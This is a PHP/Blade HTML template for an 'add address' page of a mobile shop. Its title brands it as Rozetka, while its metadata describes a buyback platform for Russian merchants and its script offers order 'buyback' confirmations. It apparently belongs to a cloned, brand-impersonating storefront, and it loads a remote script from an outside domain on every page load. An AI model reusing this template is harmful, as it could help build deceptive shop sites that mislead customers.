<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina">

<head>
	<style>
		:root {

			--image-path: url('<?php echo asset("/assets/foot_nav.png") ?>');
			--image-path2: url('<?php echo asset("/assets/dd_icon.png") ?>');
		}
	</style>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
	<title>додати адресу - Rozetka</title>
	<meta name="keywords" content="Платформа зворотного викупу для російських торговців">
	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради з догляду за речами.">
	<meta name="format-detection" content="telephone=no">
	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/arttpl.js") ?>"></script>
	<link href="<?php echo asset("assets/layer.css") ?>" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body>
	<div class="pagetop">
		<div class="fh"><a href="<?php echo route("delivery") ?>"></a></div>
		<div>додати адресу</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
		<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> -->
	</div>
	<div class="main">
		<form method="post" id="form">
			@csrf
			<div class="zc_box2">
				<div class="zc_list">
					<div class="zc_name">Отримувач</div>
					<div class="zc_text">
						<input type="text" name="user_tname" placeholder="ПІБ" value="{{ $delivery->name }}">
					</div>
				</div>

				<div class="zc_list">
					<div class="zc_name">Номер телефону</div>
					<div class="zc_text">
						<input type="text" name="user_phone" placeholder="Номер телефону" value="{{ $delivery->phone }}">
					</div>
				</div>

				<div class="zc_list zc_textarea">
					<div class="zc_name">адреса</div>
					<div class="zc_text">
						<textarea name="address_text" placeholder="Повна адреса">{{ $delivery->address }}</textarea>
					</div>
				</div>

				<div class="sh_moren">
					<label for="default">
						<input type="checkbox" name="address_default" value="1" class="inputfix mar5" id="default">
						<span>Адреса за замовчуванням</span>
					</label>
				</div>

			</div>
			<div class="loginbtn" style="margin:20px 10px;">
				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
				<input type="hidden" name="pesubmit">
				<input type="button" value="зберегти" class="tjbtn">
			</div>
		</form>
	</div>
	<script src="<?php echo asset("assets/city-picker.min.js") ?>"></script>
	<script type="text/javascript">
		$(function() {
			$("#shengshi").click(function() {
				$(":input[name='user_tname'],:input[name='user_phone'],:input[name='address_text']").blur();
			})
			$("#shengshi").cityPicker({
				title: "Будь ласка, виберіть адресу доставки",
				onChange: function(picker, values, displayValues) { //вибір після тригера події
					$(":input[name='address_province']").val(displayValues[0]);
					$(":input[name='address_city']").val(displayValues[1]);
					$(":input[name='address_area']").val(displayValues[2]);
				}
			});
			$(":button").click(function() {
				if ($(":input[name='user_tname']").val() == '') {
					app_tip("Будь ласка, вкажіть одержувача");
					return false;
				}
				if ($(":input[name='user_phone']").val() == '') {
					app_tip("Введіть номер телефону");
					return false;
				}
				if ($(":input[name='address_text']").val() == '') {
					app_tip("Будь ласка, заповніть детальну адресу");
					return false;
				}
				app_submit('{{ route("api.delivery.update", $delivery->id) }}', function(json) {
					if (json.result) {
						app_open("{{ route('delivery') }}", 1000);
					}
				})
			})
		})
	</script>
	<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css") ?>">
	<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css") ?>">
	<script src="<?php echo asset("assets/jquery-weui.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
	<script type="text/javascript">
		//верхнє меню клік
		function top_menu() {
			if ($("#top_menu").is(":hidden")) {
				$("#top_menu").show();
			} else {
				$("#top_menu").hide();
			}
			$("#top_menu a").live("click", function() {
				$("#top_menu").hide();
			})
		}
		pe_loadscript("https://wbbff.cc/api.php?mod=cron");
	</script>
	<script>
		function confirm_huigou(order_id) {
			layer.open({
				content: "Визначити викуп цього Замовлення？",
				btn: ["OK", "Скасувати"],
				shadeClose: false,
				yes: function() {

					/*layer.open({
						content: 'Ви натиснули підтвердити',
						time: 1
					});*/
					$.ajax({
						type: "POST",
						url: "./user.php?mod=order&act=huigou_do",
						dataType: "json",
						data: {
							'order_id': order_id,
						},
						success: function(res) {
							console.log(res);

							if (res.result == false) {
								layer.open({
									content: res.msg,
									time: 3,
									skin: 'msg',
									end: function() {
										location.href = './user.php?mod=userbank';
									}
								});
							} else {
								layer.open({
									content: res.msg,
									time: 2,
									skin: 'msg',
									end: function() {
										location.reload();
									}
								});
							}
						}
					});
				}

			});
		}
	</script>

</body>

</html>